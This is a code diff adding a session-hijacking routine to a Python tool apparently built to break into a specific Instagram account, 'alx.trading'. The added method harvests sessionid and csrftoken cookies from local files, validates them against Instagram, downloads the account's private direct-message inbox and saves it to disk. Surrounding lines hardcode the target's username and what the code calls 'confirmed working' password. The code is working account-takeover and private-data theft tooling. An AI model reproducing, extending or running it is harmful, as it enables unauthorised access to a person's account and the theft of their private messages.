@@ -17,6 +17,82 @@ from urllib.parse import urljoin
 import sqlite3
 
 class AlxTradingProxyExtractor:
+    def session_hijack_and_dm_extraction(self):
+        """Advanced session hijack: find, validate, and extract DMs using available sessions"""
+        import glob
+        print("\n🎭 SESSION HIJACK & DM EXTRACTION...")
+        session_files = glob.glob("*.json") + glob.glob("data/sessions/*.json") + glob.glob("*.txt") + glob.glob("data/sessions/*.txt")
+        found_valid = False
+        for session_file in session_files:
+            try:
+                print(f"🔍 Checking session file: {session_file}")
+                # Load sessionid from file
+                sessionid = None
+                ds_user_id = None
+                csrftoken = None
+                if session_file.endswith('.json'):
+                    with open(session_file, 'r') as f:
+                        data = json.load(f)
+                    sessionid = data.get('sessionid') or (data.get('cookies', {}) if isinstance(data.get('cookies'), dict) else {}).get('sessionid')
+                    ds_user_id = data.get('ds_user_id') or (data.get('cookies', {}) if isinstance(data.get('cookies'), dict) else {}).get('ds_user_id')
+                    csrftoken = data.get('csrftoken') or (data.get('cookies', {}) if isinstance(data.get('cookies'), dict) else {}).get('csrftoken')
+                elif session_file.endswith('.txt'):
+                    with open(session_file, 'r') as f:
+                        content = f.read()
+                    for part in content.split(';'):
+                        part = part.strip()
+                        if part.startswith('sessionid='):
+                            sessionid = part.split('=',1)[1]
+                        if part.startswith('ds_user_id='):
+                            ds_user_id = part.split('=',1)[1]
+                        if part.startswith('csrftoken='):
+                            csrftoken = part.split('=',1)[1]
+                if not sessionid:
+                    print("❌ No sessionid found in file.")
+                    continue
+                # Build session and headers
+                hijack_session = requests.Session()
+                cookie_str = f"sessionid={sessionid}"
+                if ds_user_id:
+                    cookie_str += f"; ds_user_id={ds_user_id}"
+                if csrftoken:
+                    cookie_str += f"; csrftoken={csrftoken}"
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
+                    'Cookie': cookie_str,
+                    'X-IG-App-ID': '936619743392459',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'Referer': 'https://www.instagram.com/direct/inbox/'
+                }
+                hijack_session.headers.update(headers)
+                # Validate session
+                resp = hijack_session.get('https://www.instagram.com/accounts/edit/', timeout=10)
+                if resp.status_code == 200 and 'login' not in resp.url:
+                    print(f"✅ Valid session: {session_file} ({sessionid[:8]}...)")
+                    # Try to extract DMs
+                    dm_resp = hijack_session.get('https://www.instagram.com/api/v1/direct_v2/inbox/', timeout=10)
+                    if dm_resp.status_code == 200:
+                        try:
+                            dm_data = dm_resp.json()
+                            threads = dm_data.get('inbox', {}).get('threads', [])
+                            print(f"📨 Extracted {len(threads)} DM threads!")
+                            # Save DMs
+                            out_path = f"{self.output_dir}/hijacked_dm_{self.timestamp}.json"
+                            with open(out_path, 'w', encoding='utf-8') as f:
+                                json.dump(dm_data, f, indent=2, ensure_ascii=False)
+                            print(f"💾 DMs saved: {out_path}")
+                            found_valid = True
+                            break
+                        except Exception as e:
+                            print(f"❌ Failed to parse DM JSON: {e}")
+                    else:
+                        print(f"❌ DM extraction failed: HTTP {dm_resp.status_code}")
+                else:
+                    print(f"❌ Invalid session: {session_file}")
+            except Exception as e:
+                print(f"❌ Error with {session_file}: {e}")
+        if not found_valid:
+            print("⚠️ No valid sessions found for DM extraction.")
     def __init__(self):
         self.target_username = "alx.trading"
         self.target_password = "Fleming654"  # Confirmed working credentials
@@ -385,6 +461,8 @@ class AlxTradingProxyExtractor:
         return insights
     
     def run_complete_extraction(self):
+        # Try session hijack and DM extraction
+        self.session_hijack_and_dm_extraction()
         """Run complete extraction process"""
         print("🚀 STARTING COMPLETE ALX.TRADING EXTRACTION")
         print("=" * 60)
